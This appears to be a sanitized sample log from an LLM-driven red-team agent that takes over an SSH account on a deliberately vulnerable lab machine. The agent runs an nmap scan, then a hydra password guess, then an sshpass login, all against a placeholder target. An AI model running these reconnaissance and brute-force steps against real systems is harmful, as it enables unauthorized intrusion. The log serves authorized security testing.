@@ -1,0 +1,140 @@
+# Sample Execution Log: SSH Compromise via Weak Credentials
+# Scenario: 01-ssh-weak-credentials.md
+# Agent Version: v1.0 (October 2025)
+# Target: Intentionally vulnerable Arch Linux system
+#
+# NOTE: This is a sanitized example showing expected agent behavior.
+# Actual output will vary based on LLM reasoning and RAG results.
+
+[AGENT] Initializing Red Team Agent (BlackArch Edition)...
+[MCP] Connecting to knowledge base...
+[MCP] Connected: 2 tools available
+[AGENT] Target: TARGET_IP
+[AGENT] BlackArch tools: LOADED
+
+============================================================
+[AGENT] OBJECTIVE: Gain SSH access to TARGET_IP using weak credentials
+============================================================
+
+────────────────────────────────────────────────────────────
+ITERATION 1/5
+────────────────────────────────────────────────────────────
+
+[RAG] Querying knowledge base: SSH brute force weak password authentication
+[RAG] Found 3 relevant sources
+
+[LLM] Consulting decision engine...
+[LLM] Response received (458 chars)
+
+[PLAN]:
+**Reasoning**: Initial reconnaissance to identify SSH service availability (MITRE ATT&CK T1046 - Network Service Discovery). Before attempting authentication, verify SSH is accessible and identify version for potential vulnerabilities.
+**Command**: `nmap -sV -p 22 TARGET_IP`
+**Expected Outcome**: Open port 22 with OpenSSH version information
+
+[EXEC] Executing: nmap -sV -p 22 TARGET_IP
+[OUTPUT]:
+Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for TARGET_IP
+Host is up (0.0012s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.5 (protocol 2.0)
+
+Service detection performed. Please report any incorrect results.
+
+[EXEC] Exit code: 0
+
+────────────────────────────────────────────────────────────
+ITERATION 2/5
+────────────────────────────────────────────────────────────
+
+# Agent detects SSH is open, now queries for authentication methods
+
+[RAG] Querying knowledge base: SSH password authentication bypass weak credentials
+[RAG] Found 3 relevant sources
+
+[LLM] Consulting decision engine...
+[LLM] Response received (512 chars)
+
+[PLAN]:
+**Reasoning**: SSH service confirmed on port 22. Knowledge base indicates password-based attacks are effective against weak credentials (MITRE ATT&CK T1110.001 - Brute Force: Password Guessing). Atomic Red Team suggests using hydra for credential testing. Will attempt common username 'victim' with weak password based on HackTricks SSH pentesting guidance.
+**Command**: `hydra -l victim -p password123 ssh://TARGET_IP -t 4`
+**Expected Outcome**: Successful credential discovery showing valid username/password pair
+
+[EXEC] Executing: hydra -l victim -p password123 ssh://TARGET_IP -t 4
+[OUTPUT]:
+Hydra v9.5 (c) 2023 by van Hauser/THC
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 1 login try (l:1/p:1)
+[DATA] attacking ssh://TARGET_IP:22/
+[22][ssh] host: TARGET_IP   login: victim   password: password123
+1 of 1 target successfully completed, 1 valid password found
+
+[EXEC] Exit code: 0
+[SUCCESS] Credentials discovered: victim:password123
+
+────────────────────────────────────────────────────────────
+ITERATION 3/5
+────────────────────────────────────────────────────────────
+
+# Agent now attempts to authenticate with discovered credentials
+
+[LLM] Consulting decision engine...
+[LLM] Response received (387 chars)
+
+[PLAN]:
+**Reasoning**: Valid credentials identified (victim:password123) via hydra. Now authenticate to SSH to verify access and gain interactive session.
+**Command**: `sshpass -p 'password123' ssh victim@TARGET_IP 'whoami && hostname'`
+**Expected Outcome**: Successful SSH authentication with output showing username and hostname
+
+[EXEC] Executing: sshpass -p 'password123' ssh victim@TARGET_IP 'whoami && hostname'
+[OUTPUT]:
+victim
+target-system
+
+[EXEC] Exit code: 0
+[SUCCESS] Gained SSH access
+
+============================================================
+[SUCCESS] OBJECTIVE ACHIEVED!
+[TIME] 28.7s (3 iterations)
+============================================================
+
+[TIMING]:
+   Total runtime: 28.7s
+   Average iteration: 9.6s
+   Fastest iteration: 7.2s
+   Slowest iteration: 12.1s
+
+[AGENT] OBJECTIVES:
+   Completed: 1
+   Failed: 0
+   Success rate: 100.0%
+
+[AGENT] COMMANDS:
+   Total executed: 3
+   Successful (exit 0): 3
+   Failed (exit != 0): 0
+   Blocked by sandbox: 0
+   Success rate: 100.0%
+
+[AGENT] AI OPERATIONS:
+   RAG queries: 2
+   LLM calls: 4
+   Total iterations: 3
+
+[LOGS]:
+   Command log: /var/log/agent/commands.log
+   Metrics JSON: /var/log/agent/metrics.json
+
+[SUCCESS] Red team exercise complete!
+
+# ================================================================
+# METRICS SUMMARY
+# ================================================================
+# Total Time: 28.7 seconds
+# Iterations: 3 (well below max of 5)
+# Success: YES (SSH access achieved)
+# MITRE ATT&CK Techniques Used:
+#   - T1046 (Network Service Discovery)
+#   - T1110.001 (Brute Force: Password Guessing)
+#   - T1078.003 (Valid Accounts: Local Accounts)
+# ================================================================
